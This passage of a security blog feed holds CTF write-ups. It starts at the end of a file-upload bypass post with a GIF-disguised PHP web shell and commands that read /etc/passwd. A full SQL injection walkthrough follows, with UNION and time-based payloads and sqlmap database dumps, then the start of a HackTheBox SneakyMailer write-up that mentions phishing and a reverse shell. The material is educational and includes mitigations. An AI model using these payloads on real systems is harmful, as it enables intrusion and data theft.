class="line">GIF89a;&lt;?=echo(system($_GET[&#x27;cmd&#x27;]));</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure><p>And now we should be able to pass our command as <code>cmd</code> parameters to get executed on server side:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://misc.ctf:33433/1592382731199.php5?cmd=cat/etc/passwd&quot;</span></span><br><span class="line">GIF89a;root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>And finally while looking for the <em>Look at Me</em> app source code we find the flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://misc.ctf:33433/1592382731199.php5?cmd=cat%20index.php&quot;</span></span><br><span class="line">GIF89a;<span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag&#123;4 IM493 k4N Hid3 PHp!&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>])) &#123;</span><br><span class="line"> <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">Weak Protections on File Upload | OWASP</a></li><li><a href="https://sushant747.gitbooks.io/total-oscp-guide/bypass_image_upload.html">Bypass File Upload Filtering | OSCP Guide</a></li><li><a href="https://medium.com/caio-noobs-around/six-files-that-are-also-a-valid-php-540343ad35c8">Six files that are also a valid PHP</a></li></ul><h2 id="Prevention-Methods"><a href="#Prevention-Methods" class="headerlink" title="Prevention Methods"></a>Prevention Methods</h2><ul><li>Use a server-generated filename if storing uploaded files on disk.</li><li>Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.</li><li>Enforce a whitelist of accepted, non-executable file extensions.</li><li>If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.</li><li>Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server’s configuration).</li><li>Reject attempts to upload archive formats such as ZIP.</li><li>Uploaded directory should not have any “execute” permission and all the script handlers should be removed from these directories.</li><li>All the control characters and Unicode ones should be removed from the filenames and their extensions without any exception.</li></ul><h2 id="Real-Life-Example"><a href="#Real-Life-Example" class="headerlink" title="Real Life Example"></a>Real Life Example</h2><ul><li><a href="https://hackerone.com/reports/506646">Webshell via File Upload on ecjobs.starbucks.com.cn</a><a href="https://hackerone.com/reports/506646"> </a><a href="https://hackerone.com/reports/506646">($4,000)</a><a href="https://hackerone.com/reports/506646"> | HackerOne</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> beginner </tag>
            
            <tag> upload bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc CTF - GraphQL Injection</title>
      <link href="/posts/misc-ctf/sql-injection/"/>
      <url>/posts/misc-ctf/sql-injection/</url>
      
        <content type="html"><![CDATA[<p>This seventh challenge aims to demonstrate a more than 20 years old bug: the infamous SQL injection. A perfect challenge for beginners.</p><p>Despite being the source a numerous data breach and exploitation every years, this vulnerability is still commonly found in a lot of web apps.</p><p><strong>Tl;Dr: Exploiting a SQL Injection on the shop website allows to retrieve a table entry containing the flag.</strong></p><p>Alright! Let’s get into the details now!</p><p><img src="https://user-images.githubusercontent.com/9076747/150655328-e1100b39-73e9-47bc-8154-4152fc53f813.png" alt="little bobby tables"></p><hr><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655341-16738d59-11cb-46bc-a218-45dfe2ebeb05.png" alt="sql injection misc ctf"></p><p>A simple e-commerce website, you can browse through products, add items to card and place an order. Nothing more.</p><p>Let’s dig a bit.<br>Browsing through the product pages we notice the <code>elements</code> parameter in the URL, probably used for pagination ?</p><p>Let’s see if we can make any type of injection through this parameter before moving to the cart and order function.</p><h2 id="SQL-Injection-Vulnerability"><a href="#SQL-Injection-Vulnerability" class="headerlink" title="SQL Injection Vulnerability"></a>SQL Injection Vulnerability</h2><p>Inputing random value as parameter returns the following message:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655385-dd97bffe-e899-4ab4-bfba-7588d9b0fa06.png" alt="sql injection test misc ctf"></p><p>When appending a classical AND 1=1 SQL injection to the elements parameters, the page don’t display errors but load the results normally:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655401-ee158f58-cea4-43ec-b9a0-09cd09786a48.png" alt="1=1 sql injection misc ctf"></p><p>To make sure we have a valid SQL Injection let’s try a sleep function injection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ time curl <span class="string">&quot;http://localhost:8080/?elements=9 OR sleep(5)&quot;</span> </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line"></span><br><span class="line">0.01s user 0.01s system 0% cpu 5.978 total</span><br></pre></td></tr></table></figure><p>Good since the request took 5 seconds to proceed, we now are 100% sure we have a valid SQL injection here. Let’s see what we can retrieve from the database using this vulnerability.</p><p><strong>Getting to know the current database</strong></p><p>To start off let’s see how to we can manually exploit the SQL injection vulnerability to exfiltrate data. In a second part we will see how to ease the task with automated exploitation tools.</p><p>To retrieve informations from the database we are going to use an <code>UNION</code> attack . Here is a nice explanation of the process:</p><blockquote><p>The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:</p><p><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></p><p>This SQL query will return a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.</p><p><a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION attacks | Web Security Academy</a></p></blockquote><p>The first thing we need to do to perform an <code>UNION</code> attack is to determine the number of columns returned from the original query (the products listing query).</p><p>You can do so using two different methods:</p><ol><li><code>ORDER BY</code> clauses injection</li></ol><p>This method consist in injecting an <code>ORDER BY</code> clauses with incremental column index until an error is returned. The advantage of <code>ORDER BY</code> is that we can specify columns index number. This way we don’t have to know the exact column name.</p><p>Let’s give it a try.</p><p>First using <code>ORDER BY 1</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655472-8f236d3b-109c-4fe6-8d91-b2728668ae02.png" alt="sql injection misc ctf union 1"></p><p>Looks alright, no error. Let’s do the same for <code>ORDER BY 2</code>, <code>ORDER BY 3</code>, and so on…</p><p>Arriving at <code>ORDER BY 4</code> we finally get the error:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655479-17cef252-4ae3-4461-b56c-4147756c3686.png" alt="sql injection misc ctf union 4"></p><p>Behind the scene, the database returns an error, such as:</p><blockquote><p>The ORDER BY position number 4 is out of range of the number of items in the select list.</p></blockquote><p>We now gained the knowledge that the current table contains 3 columns (<code>id</code>, <code>name</code>, <code>price</code> maybe ?)</p><ol><li><code>UNION SELECT</code> injection</li></ol><p>This second method involves submitting a series of <code>UNION SELECT</code> payloads specifying a different number of <code>null</code> values every-times.</p><p>If the number of nulls does not match the number of columns, the database returns an error, such as:</p><blockquote><p>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</p></blockquote><p>Again let’s give it a try:</p><p>First, using <code>UNION SELECT NULL</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655499-39f0adb9-2a6d-4289-99ed-f445b1afc31c.png" alt="sql injection misc ctf union null"></p><p>We get an error, meaning the table have more than one column.</p><p>Let’s do the same for <code>UNION SELECT NULL,NULL</code>, <code>UNION SELECT NULL,NULL,NULL</code>, and so on…</p><p>Arriving at <code>UNION SELECT NULL,NULL,NULL</code> we don’t get any errors:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655521-44dfa5bd-b6c5-4ddd-ba54-e6de5e480a38.png" alt="sql injection misc ctf multiple null union"></p><p>We now confirmed in a different way that the current table contains 3 columns.</p><p><strong>Extracting data using SQL Injection</strong></p><p>Alright we now have all the informations we need to start extracting actual data from the database.</p><p>Let’s see how we can use <code>UNION</code> attack to do so.</p><p>First, we are going to use the following query to get all the databases and tables used by the website:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_schema, table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES</span><br></pre></td></tr></table></figure><p>Embed it inside our <code>UNION</code> query gives the following payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> table_schema,table_name,<span class="keyword">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES</span><br></pre></td></tr></table></figure><p>This query should now be able to retrieve all the databases and its table name.<br>Let’s give it a try:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655558-736b3bc3-9f86-43f8-a78c-443d5956729d.png" alt="sql injection misc ctf table name"></p><p>Well… This surely looks broken but looking in the details we have all the informations we need, check the source code :</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[...]</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chop-108&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;108&quot;</span> <span class="attr">data-price</span>=<span class="string">&quot;30777&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;addToCart(this)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image/0108.jpg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>$30777<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chop-ctf&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;ctf&quot;</span> <span class="attr">data-price</span>=<span class="string">&quot;chop&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;addToCart(this)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>$chop<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chop-information_schema&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;information_schema&quot;</span> <span class="attr">data-price</span>=<span class="string">&quot;ALL_PLUGINS&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;addToCart(this)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>$ALL_PLUGINS<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>See what’s going here ? The “normal” shop SQL query request for the product <code>id</code> and <code>price</code>, using the <code>id</code> in <code>chop-&lt;product-id&gt;</code> as <code>&lt;div&gt;</code> identifier and showing <code>price</code> in <code>&lt;p&gt;</code> tag.</p><p>In our union query, the store SQL query gets replaced by our <code>UNION</code> query. The chop <code>id</code> is replaced by <code>table_schema</code> and <code>price</code> by <code>table_name</code>.</p><p>While this is not very readable we still gets all the informations we need. We now know that the only database is <code>ctf</code> and contains one table: <code>chop</code>.</p><p>Let’s continue our enumeration to get a list of each columns name in the <code>chop</code> table. We can do so using:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_type,column_name,<span class="keyword">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;chop&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p>Let’s give it a try:</p><p><img src="https://user-images.githubusercontent.com/9076747/150655589-17296254-0cc9-418d-9fb0-651c4955c1a6.png" alt="sql injection misc ctf table listing"></p><p>Awesome, we were close with our guessing. Here is all the informations we collected so far:</p><ul><li>Database: <code>ctf</code></li><li>Table: <code>chop</code></li><li>Columns: <code>id</code>, <code>price</code>, <code>image_url</code></li></ul><p>With that in mind let’s list all the lines in this <code>chop</code> database to see if we can find juicy informations:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> id,price,image_url <span class="keyword">FROM</span> chop<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/150655603-271d5fd0-875f-4bb8-9b55-cf8408e708fe.png" alt="sql injection misc ctf column listing"></p><p>Hey what’s this last product with price to $0 and broken image ?</p><p>Let’s check the source code:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chop-109&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;109&quot;</span> <span class="attr">data-price</span>=<span class="string">&quot;0&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;addToCart(this)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;FLAG&#123;5ql 1nj3c710n 4r3 571ll w1d3ly u53d!&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>$0<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Bingo!</p><h2 id="The-easy-way-SQLMap"><a href="#The-easy-way-SQLMap" class="headerlink" title="The easy way - SQLMap"></a>The easy way - SQLMap</h2><p>You noticed it. The manual way is not really easy nor fast to operate.</p><p>Thankfully (or unfortunately depending on the point of view) <code>[SQLMap](https://github.com/sqlmapproject/sqlmap)</code>, an open source tools, allows to automate all step of a SQL Injection.</p><p>Let’s have a look at what it is capable on our Chop Shop:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ sqlmap -u <span class="string">&quot;http://192.168.1.21:8080/?elements=9&quot;</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.4.3<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[15:32:14] [INFO] testing connection to the target URL</span><br><span class="line">[15:32:15] [INFO] checking <span class="keyword">if</span> the target is protected by some kind of WAF/IPS</span><br><span class="line">[15:32:15] [INFO] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[...]</span><br><span class="line">[15:32:15] [INFO] GET parameter <span class="string">&#x27;elements&#x27;</span> appears to be <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span> injectable (with --string=<span class="string">&quot;<span class="variable">$81519</span>&quot;</span>)</span><br><span class="line">[15:32:44] [INFO] GET parameter <span class="string">&#x27;elements&#x27;</span> appears to be <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable</span><br><span class="line">[15:32:44] [INFO] GET parameter <span class="string">&#x27;elements&#x27;</span> is <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span> injectable</span><br><span class="line">GET parameter <span class="string">&#x27;elements&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="keyword">if</span> any)? [y/N]</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: elements (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: elements=9 AND 3739=3739</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: elements=9 AND (SELECT 6385 FROM (SELECT(SLEEP(5)))ZgQe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: elements=9 UNION ALL SELECT CONCAT(0x71786a7a71,0x52526f7750766c6b734b4c765a464b75514e557956765964446f504e73764d7a744872505a416c44,0x71766a7171),NULL,NULL-- -</span><br><span class="line">---</span><br><span class="line">[15:33:24] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br></pre></td></tr></table></figure><p>Well that took only a bit more than 30 seconds. SQLMap can also extract all databases and tables:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://192.168.1.21:8080/?elements=9&quot;</span> --tables</span><br><span class="line">[...]</span><br><span class="line">[15:37:31] [INFO] fetching tables <span class="keyword">for</span> databases: <span class="string">&#x27;ctf, information_schema, test&#x27;</span></span><br><span class="line">Database: ctf</span><br><span class="line">[1 table]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| chop                                  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line"></span><br><span class="line">Database: information_schema</span><br><span class="line">[76 tables]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| ALL_PLUGINS                           |</span><br><span class="line">| APPLICABLE_ROLES                      |</span><br><span class="line">| CHARACTER_SETS                        |</span><br><span class="line">| CHECK_CONSTRAINTS                     |</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>And extract databases content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ sqlmap -u <span class="string">&quot;http://192.168.1.21:8080/?elements=9&quot;</span> -T chop --dump</span><br><span class="line">[...]</span><br><span class="line">[15:42:03] [INFO] fetching current database</span><br><span class="line">[15:42:03] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;chop&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">[15:42:03] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;chop&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">Database: ctf</span><br><span class="line">Table: chop</span><br><span class="line">[109 entries]</span><br><span class="line">+------+-------+--------------------------------------------+</span><br><span class="line">| id   | price | image_url                                  |</span><br><span class="line">+------+-------+--------------------------------------------+</span><br><span class="line">| 100  | 97223 | image/0100.jpg                             |</span><br><span class="line">| 101  | 49541 | image/0101.jpg                             |</span><br><span class="line">| 102  | 35913 | image/0102.jpg                             |</span><br><span class="line">| 103  | 27690 | image/0103.jpg                             |</span><br><span class="line">| 104  | 71432 | image/0104.jpg                             |</span><br><span class="line">| 105  | 23383 | image/0105.jpg                             |</span><br><span class="line">| 106  | 48010 | image/0106.jpg                             |</span><br><span class="line">| 107  | 29452 | image/0107.jpg                             |</span><br><span class="line">| 108  | 30777 | image/0108.jpg                             |</span><br><span class="line">| 109  | 0     | FLAG&#123;5ql 1nj3c710n 4r3 571ll w1d3ly u53d!&#125; |</span><br><span class="line">| 10   | 17528 | image/0010.jpg                             |</span><br><span class="line">| 11   | 91187 | image/0011.jpg                             |</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>SQLMap also <a href="https://sqlmap.org/">features</a>:</p><ul><li>Support to enumerate users, password hashes, privileges, roles, databases, tables and columns.</li><li>Automatic recognition of password hash formats and support for cracking them using a dictionary-based attack.</li><li>Dump database tables entirely.</li><li>Download and upload any file from the database server underlying file system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.</li><li>Execute arbitrary commands and retrieve their standard output.</li><li>And the list continue…</li></ul><p>As you can see SQLMap is an extremely complete and powerful tool, <strong>allowing anyone with little to no real knowledge to perform advanced SQL injection attacks.</strong><br>That’s why it’s very important to be aware of the risks of SQL Injection and why it’s still one of the most common and dangerous vulnerability.</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Primary defenses against SQL Injections:</p><ol><li>Use of Prepared Statements (with Parameterized Queries)</li><li>Use of Stored Procedures</li><li>Whitelist Input Validation</li><li>Escaping All User Supplied Input</li></ol><p>Additional Defenses:</p><ul><li>Enforcing Least Privilege</li><li>Performing Whitelist Input Validation as a Secondary Defense</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection Software Attack | OWASP Foundation</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">SQL Injection Prevention Cheat Sheet | OWASP</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">Query Parameterization Cheat Sheet | OWASP</a></li><li><a href="https://portswigger.net/web-security/sql-injection">What is SQL Injection? Tutorial &amp; Examples | Web Security Academy</a></li><li><a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION attacks | Web Security Academy</a></li></ul><h2 id="Real-Life-Example"><a href="#Real-Life-Example" class="headerlink" title="Real Life Example"></a>Real Life Example</h2><ul><li><a href="https://hackerone.com/reports/297478">SQL injection in labs.data.gov via User-agent | HackerOne</a></li><li><a href="https://hackerone.com/reports/488795">SQL injection on U.S. Dept Of Defense | HackerOne</a></li><li><a href="https://hackerone.com/reports/531051">SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database | HackerOne</a></li></ul><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> beginner </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - SneakyMailer</title>
      <link href="/posts/sneakymailer/"/>
      <url>/posts/sneakymailer/</url>
      
        <content type="html"><![CDATA[<img width="576" alt="SneakyMailer HackTheBox" src="https://user-images.githubusercontent.com/9076747/87920050-f4ca3400-ca78-11ea-9303-659ba6254f94.png"><p>SneakyMailer just retired on Hackthebox, it’s a Medium difficulty Linux box created by <a href="https://www.hackthebox.eu/home/users/profile/106709">sulcud</a>.<br>This box reminded me of a few other one like <a href="https://www.hackthebox.eu/home/machines/profile/167">Chaos</a> where you have to access victims SMTP credentials and <a href="https://www.hackthebox.eu/home/machines/profile/213">Registry</a> for the package installer instance to exploit.<br>In the end it’s a very well designed box that allowed me to play with SMTP and PyPi package manager. Highly recommended. </p><p><strong>Tl;Dr:</strong> In order to get the user flag you had use the list of users emails from the website to send phishing emails. One user will input his credentials, allowing us to connect to his mailbox and retrieve the FTP password of a developer account in his mails. From there we can upload a PHP reverse shell to get a shell as developer user. At this point you can access a PyPi server instance, create and upload a malicious package in order to get access to <code>low</code> user and get the flag.<br>To get the root flag you had to exploit a sudo configuration allowing to run <code>pip</code> command as root. To do so you create another malicious <code>setup.py</code> package that will spawn a privileged shell since it’s run as root.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.197 sneakymailer.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC sneakymailer.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> sneakymailer.htb (10.10.10.197)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">21/tcp   open  ftp      vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp     Postfix smtpd</span><br><span class="line">80/tcp   open  http     nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Did not follow redirect to http://sneakycorp.htb</span><br><span class="line">143/tcp  open  imap     Courier Imapd (released 2018)</span><br><span class="line">993/tcp  open  ssl/imap Courier Imapd (released 2018)</span><br><span class="line">8080/tcp open  http     nginx 1.14.2</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">Service Info: Host:  debian; OSs: Unix, Linux; CPE: 